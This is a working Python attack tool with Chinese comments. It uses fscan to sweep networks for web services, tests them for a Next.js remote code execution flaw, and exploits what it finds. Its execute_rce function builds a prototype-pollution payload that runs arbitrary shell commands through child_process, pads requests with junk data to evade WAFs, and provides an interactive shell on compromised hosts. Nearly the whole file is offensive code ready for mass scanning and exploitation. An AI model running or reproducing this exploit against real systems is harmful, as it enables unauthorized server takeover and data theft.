#!/usr/bin/env python3
"""
整合扫描脚本 - 结合 fscan 发现 web 服务 + scanner.py 检测漏洞 + RCE 利用
支持 fscan 自动下载、可配置参数、RCE 命令执行
"""

import argparse
import subprocess
import re
import os
import sys
import tempfile
import platform
import urllib.request
import tarfile
import zipfile
import random
import string
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 导入 scanner.py 的功能
from scanner import check_vulnerability, Colors, colorize, print_result, save_results, print_banner


# ==================== fscan 自动下载 ====================

FSCAN_RELEASES = {
    "linux_amd64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan_amd64",
    "linux_arm64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan_arm64",
    "darwin_amd64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan_darwin_amd64",
    "darwin_arm64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan_darwin_arm64",
    "windows_amd64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan64.exe",
}


def get_system_arch():
    """获取系统架构"""
    system = platform.system().lower()
    machine = platform.machine().lower()

    if machine in ("x86_64", "amd64"):
        arch = "amd64"
    elif machine in ("aarch64", "arm64"):
        arch = "arm64"
    else:
        arch = machine

    return f"{system}_{arch}"


def download_fscan(dest_path: str) -> bool:
    """自动下载 fscan"""
    arch = get_system_arch()

    if arch not in FSCAN_RELEASES:
        print(colorize(f"[ERROR] 不支持的系统架构: {arch}", Colors.RED))
        print(colorize(f"[*] 支持的架构: {', '.join(FSCAN_RELEASES.keys())}", Colors.YELLOW))
        return False

    url = FSCAN_RELEASES[arch]
    print(colorize(f"[*] 正在下载 fscan ({arch})...", Colors.CYAN))
    print(colorize(f"[*] URL: {url}", Colors.CYAN))

    try:
        # 下载文件
        urllib.request.urlretrieve(url, dest_path)

        # 设置可执行权限 (非 Windows)
        if not platform.system().lower().startswith("win"):
            os.chmod(dest_path, 0o755)

        print(colorize(f"[+] fscan 下载成功: {dest_path}", Colors.GREEN))
        return True

    except Exception as e:
        print(colorize(f"[ERROR] 下载 fscan 失败: {e}", Colors.RED))
        return False


def ensure_fscan(script_dir: str) -> str:
    """确保 fscan 存在，不存在则自动下载"""
    if platform.system().lower().startswith("win"):
        fscan_name = "fscan.exe"
    else:
        fscan_name = "fscan"

    fscan_path = os.path.join(script_dir, fscan_name)

    if os.path.exists(fscan_path):
        return fscan_path

    print(colorize("[*] fscan 不存在，尝试自动下载...", Colors.YELLOW))

    if download_fscan(fscan_path):
        return fscan_path

    return None


# ==================== fscan 扫描 ====================

def run_fscan(target: str, ports: str = "1-65535", threads: int = 100,
              timeout: int = 3, no_ping: bool = False, fscan_path: str = None) -> str:
    """
    运行 fscan 扫描目标，发现 web 服务
    """
    if fscan_path is None:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        fscan_path = ensure_fscan(script_dir)

    if fscan_path is None or not os.path.exists(fscan_path):
        print(colorize("[ERROR] fscan 不存在且无法下载", Colors.RED))
        sys.exit(1)

    # 创建临时输出文件
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        output_file = f.name

    print(colorize(f"[*] 开始 fscan 扫描: {target}", Colors.CYAN))
    print(colorize(f"[*] 端口范围: {ports}", Colors.CYAN))
    print(colorize(f"[*] 线程数: {threads}", Colors.CYAN))
    print(colorize(f"[*] No Ping: {no_ping}", Colors.CYAN))
    print()

    cmd = [
        fscan_path,
        "-h", target,
        "-p", ports,
        "-t", str(threads),
        "-time", str(timeout),
        "-o", output_file,
        "-nobr",      # 不进行暴力破解
        "-nopoc",     # 不运行 poc (我们用 scanner.py)
        "-nocolor"
    ]

    # 可选: 不 ping
    if no_ping:
        cmd.append("-np")

    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        # 实时输出 fscan 结果
        for line in process.stdout:
            print(line.rstrip())

        process.wait()

        # 读取输出文件
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                result = f.read()
            os.unlink(output_file)
            return result
        return ""

    except Exception as e:
        print(colorize(f"[ERROR] fscan 执行失败: {e}", Colors.RED))
        return ""


def extract_web_urls(fscan_output: str) -> list:
    """
    从 fscan 输出中提取 web 服务 URL
    """
    urls = set()

    patterns = [
        r'(https?://[\d\.]+:\d+)',           # http://ip:port
        r'(https?://[\d\.]+)',                # http://ip (默认端口)
        r'\[WebTitle\]\s+(https?://[^\s]+)',  # WebTitle 行
        r'WebTitle\s+(https?://[^\s]+)',      # WebTitle 无括号
    ]

    for pattern in patterns:
        matches = re.findall(pattern, fscan_output)
        urls.update(matches)

    # 从开放端口构造 URL
    port_pattern = r'([\d\.]+):(\d+)\s+open'
    port_matches = re.findall(port_pattern, fscan_output)

    web_ports = {80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000, 9090, 8081, 8082}

    for ip, port in port_matches:
        port_int = int(port)
        if port_int in web_ports or port_int > 1024:
            if port_int == 443 or port_int == 8443:
                urls.add(f"https://{ip}:{port}")
            else:
                urls.add(f"http://{ip}:{port}")

    return sorted(list(urls))


# ==================== 漏洞扫描 ====================

def scan_vulnerabilities(urls: list, threads: int = 10, timeout: int = 10,
                         waf_bypass: bool = True, safe_check: bool = False,
                         verbose: bool = False) -> tuple:
    """
    使用 scanner.py 扫描漏洞
    """
    print()
    print(colorize("=" * 60, Colors.CYAN))
    print(colorize(f"[*] 开始漏洞检测，共 {len(urls)} 个目标", Colors.CYAN))
    print(colorize("=" * 60, Colors.CYAN))
    print()

    results = []
    vulnerable_count = 0
    error_count = 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(
                check_vulnerability,
                url,
                timeout,
                False,  # verify_ssl
                True,   # follow_redirects
                None,   # custom_headers
                safe_check,
                False,  # windows
                waf_bypass,
                128     # waf_bypass_size_kb
            ): url
            for url in urls
        }

        from tqdm import tqdm
        with tqdm(
            total=len(urls),
            desc=colorize("漏洞检测", Colors.CYAN),
            unit="url",
            ncols=80
        ) as pbar:
            for future in as_completed(futures):
                result = future.result()
                results.append(result)

                if result["vulnerable"]:
                    vulnerable_count += 1
                    tqdm.write("")
                    print_result(result, verbose)
                elif result["error"]:
                    error_count += 1
                    if verbose:
                        tqdm.write("")
                        print_result(result, verbose)
                elif verbose:
                    tqdm.write("")
                    print_result(result, verbose)

                pbar.update(1)

    return results, vulnerable_count, error_count


# ==================== RCE 利用 ====================

def execute_rce(target: str, cmd: str, timeout: int = 30) -> str:
    """
    通过 Next.js RCE 漏洞执行命令并返回输出
    """
    boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'

    # 构建 payload - base64 编码输出便于提取
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}|base64 -w0')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    # 生成 128KB junk data 用于 WAF bypass
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=128*1024))

    parts = []
    parts.append(f'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n'
                 f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n{junk}\r\n')
    parts.append(f'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n'
                 f'Content-Disposition: form-data; name="0"\r\n\r\n{part0}\r\n')
    parts.append(f'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n'
                 f'Content-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n')
    parts.append(f'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n'
                 f'Content-Disposition: form-data; name="2"\r\n\r\n[]\r\n')
    parts.append('------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n')

    body = ''.join(parts)

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Assetnote/1.0.0',
        'Next-Action': 'x',
        'X-Nextjs-Request-Id': 'b5dce965',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
    }

    # 确保 target 以 / 结尾
    if not target.endswith('/'):
        target = target + '/'

    try:
        resp = requests.post(target, headers=headers, data=body, timeout=timeout,
                           verify=False, allow_redirects=False)

        redirect = resp.headers.get('x-action-redirect', '')
        if '?a=' in redirect:
            b64 = redirect.split('?a=')[1].split(';')[0]
            try:
                return base64.b64decode(b64).decode()
            except:
                return f"[Raw] {b64}"

        return f"[No output] Status: {resp.status_code}"

    except Exception as e:
        return f"[Error] {str(e)}"


def interactive_shell(target: str):
    """交互式 shell"""
    print(colorize(f"\n[*] 进入交互式 shell - 目标: {target}", Colors.CYAN))
    print(colorize("[*] 输入 'exit' 或 'quit' 退出\n", Colors.CYAN))

    while True:
        try:
            cmd = input(colorize("shell> ", Colors.GREEN)).strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                print(colorize("[*] 退出交互式 shell", Colors.CYAN))
                break

            output = execute_rce(target, cmd)
            print(output)

        except KeyboardInterrupt:
            print(colorize("\n[*] 退出交互式 shell", Colors.CYAN))
            break
        except EOFError:
            break


# ==================== 主函数 ====================

def main():
    parser = argparse.ArgumentParser(
        description="整合扫描工具 - fscan + React2Shell Scanner + RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  扫描网段:
    %(prog)s -t 192.168.1.0/24
    %(prog)s -t 192.168.1.0/24 -p 80,443,8080 --fscan-threads 1000
    %(prog)s -t 192.168.1.0/24 --no-ping  # 启用 ping 发现存活主机

  执行 RCE:
    %(prog)s --rce http://192.168.1.x:5000 --cmd "id"
    %(prog)s --rce http://192.168.1.x:5000 --shell  # 交互式 shell
        """
    )

    # 扫描参数
    scan_group = parser.add_argument_group('扫描选项')
    scan_group.add_argument(
        "-t", "--target",
        help="目标 IP 或 CIDR (如: 192.168.1.0/24)"
    )
    scan_group.add_argument(
        "-p", "--ports",
        default="1-65535",
        help="端口范围 (默认: 1-65535)"
    )
    scan_group.add_argument(
        "--fscan-threads",
        type=int,
        default=500,
        help="fscan 线程数 (默认: 500)"
    )
    scan_group.add_argument(
        "--scan-threads",
        type=int,
        default=20,
        help="漏洞扫描线程数 (默认: 20)"
    )
    scan_group.add_argument(
        "--timeout",
        type=int,
        default=15,
        help="请求超时时间 (默认: 15秒)"
    )
    scan_group.add_argument(
        "--no-ping",
        action="store_true",
        help="fscan 不使用 ping (扫描全部IP，较慢)"
    )
    scan_group.add_argument(
        "-o", "--output",
        help="输出结果到 JSON 文件"
    )
    scan_group.add_argument(
        "--safe-check",
        action="store_true",
        help="使用安全的侧信道检测而非 RCE PoC"
    )
    scan_group.add_argument(
        "--no-waf-bypass",
        action="store_true",
        help="禁用 WAF 绕过"
    )
    scan_group.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="详细输出"
    )
    scan_group.add_argument(
        "--skip-fscan",
        help="跳过 fscan，直接从文件加载 URL 列表"
    )

    # RCE 参数
    rce_group = parser.add_argument_group('RCE 利用选项')
    rce_group.add_argument(
        "--rce",
        metavar="URL",
        help="对指定目标执行 RCE"
    )
    rce_group.add_argument(
        "--cmd",
        help="要执行的命令"
    )
    rce_group.add_argument(
        "--shell",
        action="store_true",
        help="进入交互式 shell"
    )

    args = parser.parse_args()

    # RCE 模式
    if args.rce:
        print_banner()
        print(colorize("[*] RCE 利用模式", Colors.CYAN))

        if args.shell:
            interactive_shell(args.rce)
        elif args.cmd:
            print(colorize(f"[*] 目标: {args.rce}", Colors.CYAN))
            print(colorize(f"[*] 命令: {args.cmd}", Colors.CYAN))
            print()
            output = execute_rce(args.rce, args.cmd, args.timeout)
            print(colorize("[+] 输出:", Colors.GREEN))
            print(output)
        else:
            print(colorize("[ERROR] RCE 模式需要指定 --cmd 或 --shell", Colors.RED))
            sys.exit(1)
        return

    # 扫描模式
    if not args.target and not args.skip_fscan:
        parser.print_help()
        sys.exit(1)

    print_banner()
    print(colorize("[*] 整合扫描模式: fscan + React2Shell Scanner", Colors.CYAN))
    print()

    # 步骤1: 运行 fscan 或加载 URL 列表
    if args.skip_fscan:
        print(colorize(f"[*] 从文件加载 URL: {args.skip_fscan}", Colors.CYAN))
        with open(args.skip_fscan, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and line.strip().startswith('http')]
    else:
        fscan_output = run_fscan(
            args.target,
            args.ports,
            args.fscan_threads,
            no_ping=args.no_ping
        )

        # 步骤2: 提取 web URL
        urls = extract_web_urls(fscan_output)

    if not urls:
        print(colorize("[!] 未发现任何 web 服务", Colors.YELLOW))
        sys.exit(0)

    print()
    print(colorize(f"[+] 发现 {len(urls)} 个 web 服务:", Colors.GREEN))
    for url in urls[:20]:
        print(f"    {url}")
    if len(urls) > 20:
        print(f"    ... 还有 {len(urls) - 20} 个")
    print()

    # 步骤3: 漏洞扫描
    results, vulnerable_count, error_count = scan_vulnerabilities(
        urls,
        threads=args.scan_threads,
        timeout=args.timeout,
        waf_bypass=not args.no_waf_bypass,
        safe_check=args.safe_check,
        verbose=args.verbose
    )

    # 输出总结
    print()
    print(colorize("=" * 60, Colors.CYAN))
    print(colorize("扫描总结", Colors.BOLD))
    print(colorize("=" * 60, Colors.CYAN))
    print(f"  扫描目标: {args.target or args.skip_fscan}")
    print(f"  发现 Web 服务: {len(urls)}")

    if vulnerable_count > 0:
        print(f"  {colorize(f'存在漏洞: {vulnerable_count}', Colors.RED + Colors.BOLD)}")

        # 列出存在漏洞的目标
        print()
        print(colorize("  存在漏洞的目标:", Colors.RED))
        for r in results:
            if r.get("vulnerable"):
                print(colorize(f"    - {r['host']}", Colors.RED))
        print()
        print(colorize("  使用以下命令执行 RCE:", Colors.YELLOW))
        for r in results:
            if r.get("vulnerable"):
                print(colorize(f"    python3 {sys.argv[0]} --rce {r['host']} --shell", Colors.YELLOW))
                break
    else:
        print(f"  存在漏洞: {vulnerable_count}")

    print(f"  无漏洞: {len(urls) - vulnerable_count - error_count}")
    print(f"  错误: {error_count}")
    print(colorize("=" * 60, Colors.CYAN))

    # 保存结果
    if args.output:
        save_results(results, args.output, vulnerable_only=False)

    if vulnerable_count > 0:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()
